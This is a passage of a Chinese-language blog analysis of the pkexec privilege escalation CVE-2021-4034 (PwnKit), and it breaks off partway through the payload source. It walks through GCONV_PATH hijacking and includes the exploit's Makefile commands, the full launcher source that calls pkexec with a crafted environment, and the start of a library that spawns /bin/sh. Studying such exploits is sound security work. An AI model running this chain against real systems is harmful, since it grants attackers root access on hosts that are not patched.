class="line">  -l, --list                 list all known coded character sets</span><br><span class="line"></span><br><span class="line"> Output control:</span><br><span class="line">  -c                         omit invalid characters from output</span><br><span class="line">  -o, --output=FILE          output file</span><br><span class="line">  -s, --silent               suppress warnings</span><br><span class="line">      --verbose              print progress information</span><br><span class="line"></span><br><span class="line">  -?, --help                 Give this help list</span><br><span class="line">      --usage                Give a short usage message</span><br><span class="line">  -V, --version              Print program version</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f UTF-8 -t UTF-16 &lt; input file &gt; output file</span><br></pre></td></tr></table></figure><p><code>iconv</code>  会调用 <code>iconv_open()</code>  而 <code>iconv_open()</code>  依赖环境变量 <code>GCONV_PATH</code></p><blockquote><p>The iconv support extension the charset conversion ability by user defined gconv module. When use iconv or call iconv() function, it must first allocate a conversion descriptor using <a href="https://man7.org/linux/man-pages/man3/iconv_open.3.html">iconv_open()</a>. The operation of this function will influence by the enviroment GCONV_PATH</p></blockquote><p><em><strong>此处应该有源码，之后补</strong></em><br>用 <code>GCONV_PATH</code>  指定自定义模块去替换系统模块<br>所以利用方法如下</p><blockquote><p>Suppose we can control the content of enviroment GCONV_PATH, provide a gconv module configuration file and gconv module with evil code. The evil code may be execute for some case.</p></blockquote><p><a href="https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html#6.5.4.1%20Format%20of%20gconv-modules%20files">gconv 格式</a></p><h3 id="关于argv和environ"><a class="markdownIt-Anchor" href="#关于argv和environ">#</a> 关于 argv 和 environ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">environ</span></span><br><span class="line">00:0000│ rdx 0x7fffffffe018 —▸ 0x7fffffffe374 ◂— &#x27;SHELL=/bin/bash&#x27;</span><br><span class="line">01:0008│     0x7fffffffe020 —▸ 0x7fffffffe384 ◂— &#x27;SESSION_MANAGER=local/squ-virtual-machine:@/tmp/.ICE-unix/1566,unix/squ-virtual-machine:/tmp/.ICE-unix/1566&#x27;</span><br><span class="line">02:0010│     0x7fffffffe028 —▸ 0x7fffffffe3f0 ◂— &#x27;QT_ACCESSIBILITY=1&#x27;</span><br><span class="line">03:0018│     0x7fffffffe030 —▸ 0x7fffffffe403 ◂— &#x27;COLORTERM=truecolor&#x27;</span><br><span class="line">04:0020│     0x7fffffffe038 —▸ 0x7fffffffe417 ◂— &#x27;XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg&#x27;</span><br><span class="line">05:0028│     0x7fffffffe040 —▸ 0x7fffffffe444 ◂— &#x27;XDG_MENU_PREFIX=gnome-&#x27;</span><br><span class="line">06:0030│     0x7fffffffe048 —▸ 0x7fffffffe45b ◂— &#x27;GNOME_DESKTOP_SESSION_ID=this-is-deprecated&#x27;</span><br><span class="line">07:0038│     0x7fffffffe050 —▸ 0x7fffffffe487 ◂— &#x27;LC_ADDRESS=zh_CN.UTF-8&#x27;</span><br><span class="line">08:0040│     0x7fffffffe058 —▸ 0x7fffffffe49e ◂— &#x27;GNOME_SHELL_SESSION_MODE=ubuntu&#x27;</span><br><span class="line">09:0048│     0x7fffffffe060 —▸ 0x7fffffffe4be ◂— &#x27;LC_NAME=zh_CN.UTF-8&#x27;</span><br><span class="line">0a:0050│     0x7fffffffe068 —▸ 0x7fffffffe4d2 ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class="line">0b:0058│     0x7fffffffe070 —▸ 0x7fffffffe4fb ◂— &#x27;XMODIFIERS=@im=ibus&#x27;</span><br><span class="line">0c:0060│     0x7fffffffe078 —▸ 0x7fffffffe50f ◂— &#x27;DESKTOP_SESSION=ubuntu&#x27;</span><br><span class="line">0d:0068│     0x7fffffffe080 —▸ 0x7fffffffe526 ◂— &#x27;LC_MONETARY=zh_CN.UTF-8&#x27;</span><br><span class="line">0e:0070│     0x7fffffffe088 —▸ 0x7fffffffe53e ◂— &#x27;SSH_AGENT_PID=1528&#x27;</span><br><span class="line">0f:0078│     0x7fffffffe090 —▸ 0x7fffffffe551 ◂— &#x27;GTK_MODULES=gail:atk-bridge&#x27;</span><br><span class="line">10:0080│     0x7fffffffe098 —▸ 0x7fffffffe56d ◂— &#x27;PWD=/home/squ/Desktop&#x27;</span><br><span class="line">11:0088│     0x7fffffffe0a0 —▸ 0x7fffffffe583 ◂— &#x27;XDG_SESSION_DESKTOP=ubuntu&#x27;</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">argv</span></span><br><span class="line">00:0000│ rsi 0x7fffffffe008 —▸ 0x7fffffffe35c ◂— &#x27;/home/squ/Desktop/a.out&#x27;</span><br><span class="line">01:0008│     0x7fffffffe010 ◂— 0x0</span><br></pre></td></tr></table></figure><p><code>argv</code>  的第一个参数是自己的绝对路径，第二个参数是 <code>NULL</code></p><h4 id="execvec"><a class="markdownIt-Anchor" href="#execvec">#</a> execve.c</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span>* <span class="type">const</span> argv[] = &#123;</span><br><span class="line">        <span class="string">&quot;AAAA1111&quot;</span>,</span><br><span class="line">        <span class="string">&quot;BBBB2222&quot;</span>,</span><br><span class="line">        <span class="string">&quot;CCCC3333&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span>* <span class="type">const</span> envp[] = &#123;</span><br><span class="line">        <span class="string">&quot;DDDD3333&quot;</span>,</span><br><span class="line">        <span class="string">&quot;EEEE4444&quot;</span>,</span><br><span class="line">        <span class="string">&quot;FFFF5555&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">execve</span>(<span class="string">&quot;./test&quot;</span>, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="testc"><a class="markdownIt-Anchor" href="#testc">#</a> test.c</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;argc: %d\n&quot;</span>, argc);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argv[i]!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;argv[%d]: %s\n&quot;</span>, i, argv[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;argv[%d]: NULL\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="结果"><a class="markdownIt-Anchor" href="#结果">#</a> 结果</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">squ@squ-<span class="keyword">virtual</span>-machine:~/Desktop$ ./execve </span><br><span class="line">argc: <span class="number">3</span></span><br><span class="line">argv[<span class="number">0</span>]: AAAA1111</span><br><span class="line">argv[<span class="number">1</span>]: BBBB2222</span><br><span class="line">argv[<span class="number">2</span>]: CCCC3333</span><br><span class="line">argv[<span class="number">3</span>]: <span class="literal">NULL</span></span><br><span class="line">argv[<span class="number">4</span>]: DDDD3333</span><br><span class="line">argv[<span class="number">5</span>]: EEEE4444</span><br><span class="line">argv[<span class="number">6</span>]: FFFF5555</span><br><span class="line">argv[<span class="number">7</span>]: <span class="literal">NULL</span></span><br></pre></td></tr></table></figure><p>argc 是自动计算的</p><h4 id="agrv不传入的情况"><a class="markdownIt-Anchor" href="#agrv不传入的情况">#</a> agrv 不传入的情况？</h4><p>修改为 <code>char* const argv[] = &#123;NULL&#125;</code> <br> 就没有 argc 了，而 <code>argv[1]</code>  是 <code>environ[0]</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">squ@squ-<span class="keyword">virtual</span>-machine:~/Desktop$ ./execve </span><br><span class="line">argc: <span class="number">0</span></span><br><span class="line">argv[<span class="number">0</span>]: <span class="literal">NULL</span></span><br><span class="line">argv[<span class="number">1</span>]: DDDD3333</span><br><span class="line">argv[<span class="number">2</span>]: EEEE4444</span><br><span class="line">argv[<span class="number">3</span>]: FFFF5555</span><br><span class="line">argv[<span class="number">4</span>]: <span class="function"><span class="literal">NULL</span></span></span><br><span class="line"><span class="function">Segmentation <span class="title">fault</span> <span class="params">(core dumped)</span></span></span><br></pre></td></tr></table></figure><h3 id="关于调用iconv的办法"><a class="markdownIt-Anchor" href="#关于调用iconv的办法">#</a> 关于调用 iconv 的办法</h3><p>如果劫持了 <code>GCONV_PATH</code>  就需要调用 <code>iconv()</code>  才行，在 <code>pkexec.c</code>  源码 369 行位置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> gboolean</span></span><br><span class="line"><span class="function"><span class="title">validate_environment_variable</span> <span class="params">(<span class="type">const</span> gchar *key,</span></span></span><br><span class="line"><span class="params"><span class="function">                               <span class="type">const</span> gchar *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  gboolean ret;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Generally we bail if any environment variable value contains</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   *   - &#x27;/&#x27; characters</span></span><br><span class="line"><span class="comment">   *   - &#x27;%&#x27; characters</span></span><br><span class="line"><span class="comment">   *   - &#x27;..&#x27; substrings</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">g_return_val_if_fail</span> (key != <span class="literal">NULL</span>, FALSE);</span><br><span class="line">  <span class="built_in">g_return_val_if_fail</span> (value != <span class="literal">NULL</span>, FALSE);</span><br><span class="line"></span><br><span class="line">  ret = FALSE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* special case $SHELL */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">g_strcmp0</span> (key, <span class="string">&quot;SHELL&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* check if it&#x27;s in /etc/shells */</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">is_valid_shell</span> (value))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">log_message</span> (LOG_CRIT, TRUE,</span><br><span class="line">                       <span class="string">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);</span><br><span class="line">          <span class="built_in">g_printerr</span> (<span class="string">&quot;\n&quot;</span></span><br><span class="line">                      <span class="string">&quot;This incident has been reported.\n&quot;</span>);</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="built_in">g_strcmp0</span> (key, <span class="string">&quot;XAUTHORITY&quot;</span>) != <span class="number">0</span> &amp;&amp; <span class="built_in">strstr</span> (value, <span class="string">&quot;/&quot;</span>) != <span class="literal">NULL</span>) ||</span><br><span class="line">           <span class="built_in">strstr</span> (value, <span class="string">&quot;%&quot;</span>) != <span class="literal">NULL</span> ||</span><br><span class="line">           <span class="built_in">strstr</span> (value, <span class="string">&quot;..&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">log_message</span> (LOG_CRIT, TRUE,</span><br><span class="line">                   <span class="string">&quot;The value for environment variable %s contains suscipious content&quot;</span>,</span><br><span class="line">                   key);</span><br><span class="line">      <span class="built_in">g_printerr</span> (<span class="string">&quot;\n&quot;</span></span><br><span class="line">                  <span class="string">&quot;This incident has been reported.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ret = TRUE;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">g_strcmp0</span> (key, <span class="string">&quot;SHELL&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* check if it&#x27;s in /etc/shells */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">is_valid_shell</span> (value)) <span class="comment">// SHELL值不合法 调用g_printerr</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">log_message</span> (LOG_CRIT, TRUE,</span><br><span class="line">                     <span class="string">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);</span><br><span class="line">        <span class="built_in">g_printerr</span> (<span class="string">&quot;\n&quot;</span></span><br><span class="line">                    <span class="string">&quot;This incident has been reported.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果构造了一个错误的 <code>SHELL</code>  环境变量，就会调用 <code>g_printerr</code> （当然也可以利用 <code>XAUTHORITY</code>  来打）<br>而 <code>g_printerr</code>  默认是 <code>UTF-8</code>  格式，他会检查 <code>CHARSET</code>  变量，对输出格式进行转码，就会调用 <code>iconv</code> ，然后 <code>iconv</code>  会调用 <code>iconv_open</code>  初始化， <code>iconv_open</code>  会根据 <code>GCONV_PATH</code>  找到 <code>gconv-modules</code>  文件，再根据 <code>gconv-modules</code>  文件的指示找到参数对应字符集的 so 库，调用 so 库中的 <code>gconv()</code>  和 <code>gonv_init()</code>  函数。</p><h2 id="利用方法"><a class="markdownIt-Anchor" href="#利用方法">#</a> 利用方法</h2><ol><li>创建一个 <code>GCONV_PATH=.</code>  的目录</li><li>在上面目录下创建我们的恶意库</li><li>在本目录下创建 <code>gconv-modules</code>  文件，写入 <code>module UTF-8// PWNKIT// pwnkit 1</code></li><li>设置环境变量<ol><li>第一个是恶意库 <code>pwnkit.so:.</code></li><li>第二个环境变量  <code>PATH=GCONV_PATH=.</code>  这样  <code>g_find_program_in_path</code>  函数组合出的路径就是 <code>GCONV_PATH=./pwnkit.so:.</code>  （ <code>PATH</code> + <code>NAME</code> = <code>GCONV_PATH=.</code> + <code>/</code> + <code>pwnkit.so:.</code> ）</li><li><code>CHARSET=PWNKIT</code> ，指定字符集为 <code>pwnkit</code></li></ol></li></ol><blockquote><p>如环境变量 “PATH=name”，如果 name 目录存在，并且 name 目录下也有 value 可执行程序，那么 envp [0] 的便指向 name/value；<br>如环境变量设置为 “PATH=name=.”，并且 “name=.” 目录下也有 value 可执行程序，那么 envp [0] 的便指向 “name=./value”。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (argv[n] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  argv[n] = path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对环境变量的回写</p><h3 id="流程"><a class="markdownIt-Anchor" href="#流程">#</a> 流程</h3><ol><li>execve 执行 pkexec，无参传入，造成越界错误执行 <code>environ[0]</code></li><li>612 行 argv [1] 越界访问的是 envp [0]，获取到 value 值，和 path 组合后写回；（实现了一次找到路径的写入）此时 <code>GCONV_PATH</code>  已经被篡改</li><li>检测到 <code>SHELL</code>  变量问题，调用 <code>g_printerr</code></li><li>根据 <code>CHARSET</code>  变量，需要转码，调用 <code>iconv</code> ，然后 <code>iconv_open</code></li><li>根据 <code>GCONV_PATH</code>  找到 <code>gconv-modules</code> , 然后找到我们的恶意库</li><li>调用函数 <code>gonv_init()</code> , 提权拿下！</li></ol><h2 id="gconv_path漏洞demo"><a class="markdownIt-Anchor" href="#gconv_path漏洞demo">#</a> GCONV_PATH 漏洞 demo</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file name hack.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gconv_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you be hacked alreadly!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;touch you_be_hacked.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -o ./hack.so hack.c</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export CHARSET=HACK</span><br><span class="line">export GCONV_PATH=.</span><br><span class="line"></span><br><span class="line">gcc -shared -fPIC -o ./hack.so hack.c</span><br><span class="line">echo &quot;module HACK// UTF-8// hack 1&quot; &gt; gconv-modules</span><br></pre></td></tr></table></figure><p>这样就布置好了所有准备，然后手动调用 <code>iconv</code> ，虽然我想用 <code>g_printerr</code> ? 但是编译不通？？<br>hacked！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">squ@squ-virtual-machine:~/Desktop/iconv$ iconv -f HACK -t UTF-8 &lt; hack.c</span><br><span class="line">you be hacked alreadly!</span><br><span class="line">iconv: iconv.c:91: iconv: Assertion `!&quot;Nothing like this should happen&quot;&#x27; failed.</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure><h3 id="module语法"><a class="markdownIt-Anchor" href="#module语法">#</a> module 语法</h3><p><a href="https://xy2401.com/local-docs/gnu/manual.zh/libc/glibc-iconv-Implementation.html">https://xy2401.com/local-docs/gnu/manual.zh/libc/glibc-iconv-Implementation.html</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module AAAA// BBBB// name 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从 AAAA编码到 BBBB编码 根据name.so规则 消耗cast值为1</span></span><br></pre></td></tr></table></figure><p>然后 <code>iconv</code>  不知道 <code>CHARSET</code>  中的 <code>HACK</code>  是什么字符集，就会找到 <code>GCONV_PATH</code>  路径下的 <code>gconv_modules</code>  去找解码工具，然后就落入我们的恶意库了，所以能控制 <code>GCONV_PATH</code>  就能恶意代码执行</p><h2 id="分析poc"><a class="markdownIt-Anchor" href="#分析poc">#</a> 分析 POC</h2><h3 id="make做的事"><a class="markdownIt-Anchor" href="#make做的事">#</a> make 做的事</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c</span><br><span class="line">cc -Wall    cve-2021-4034.c   -o cve-2021-4034</span><br><span class="line">echo &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &gt; gconv-modules</span><br><span class="line">mkdir -p GCONV_PATH=.</span><br><span class="line">cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.</span><br></pre></td></tr></table></figure><p>先是在当前目录下生成了 <code>pwnkit.so</code>  的库<br>然后编译了 <code>cve-2021-4034</code> <br> 然后传入一句话给 <code>gconv-modules</code> <br> 创建一个文件夹，名字为 <code>GCONV_PATH=.</code> <br> 最后 cp <code>/usr/bin/true</code>  到 <code>GCONV_PATH=.</code>  文件夹路径下的 <code>pwnkit.so:.</code>  里去 <code>-f</code>  是 force 强制把 <code>/usr/bin/true</code>  这个文件 cp 到目标路径，因为 <code>pkexec</code>  要执行 <code>PATH</code>  路径下的第一个参数，就必须让 pkexec 空执行，所以目标就被替换成 <code>true</code> ，怎么执行都不会出错<br>当前目录结构</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── cve-2021-4034.c</span><br><span class="line">├── cve-2021-4034.sh</span><br><span class="line">├── dry-run</span><br><span class="line">│   ├── dry-run-cve-2021-4034.c</span><br><span class="line">│   ├── Makefile</span><br><span class="line">│   └── pwnkit-dry-run.c</span><br><span class="line">├── LICENSE</span><br><span class="line">├── Makefile</span><br><span class="line">├── pwnkit.c</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure><p>make 之后的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── cve-2021-4034</span><br><span class="line">├── cve-2021-4034.c</span><br><span class="line">├── cve-2021-4034.sh</span><br><span class="line">├── dry-run</span><br><span class="line">│   ├── dry-run-cve-2021-4034.c</span><br><span class="line">│   ├── Makefile</span><br><span class="line">│   └── pwnkit-dry-run.c</span><br><span class="line">├── gconv-modules</span><br><span class="line">├── GCONV_PATH=.</span><br><span class="line">│   └── pwnkit.so:.</span><br><span class="line">├── LICENSE</span><br><span class="line">├── Makefile</span><br><span class="line">├── pwnkit.c</span><br><span class="line">├── pwnkit.so</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure><h3 id="cve-2021-4034c"><a class="markdownIt-Anchor" href="#cve-2021-4034c">#</a> cve-2021-4034.c</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">char * const args[] = &#123;</span><br><span class="line">NULL</span><br><span class="line">&#125;;</span><br><span class="line">char * const environ[] = &#123;</span><br><span class="line">&quot;pwnkit.so:.&quot;,</span><br><span class="line">&quot;PATH=GCONV_PATH=.&quot;,</span><br><span class="line">&quot;SHELL=/lol/i/do/not/exists&quot;,</span><br><span class="line">&quot;CHARSET=PWNKIT&quot;,</span><br><span class="line">&quot;GIO_USE_VFS=&quot;,</span><br><span class="line">NULL</span><br><span class="line">&#125;;</span><br><span class="line">return execve(&quot;/usr/bin/pkexec&quot;, args, environ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个环境变量指向 <code>pwnkit.so:.</code> ，拼接后就是 <code>GCONV_PATH=./pwnkit.so:.</code> <br> <code>:</code>  的作用我在网上都没查到很好的介绍，我理解为二级指针会遍历由 <code>:</code>  分割的路径，，，<br>也就是第二轮循环会变成 <code>GCONV_PATH=.</code> ，引导向当时的恶意库</p><h3 id="pwnkitc"><a class="markdownIt-Anchor" href="#pwnkitc">#</a> pwnkit.c</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gconv</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gconv_init</span><span class="params">(<span class="type">void</span> *step)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> * <span class="type">const</span> args[] = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="type">char</span> * <span class="type">const</span> environ[] = &#123; <span 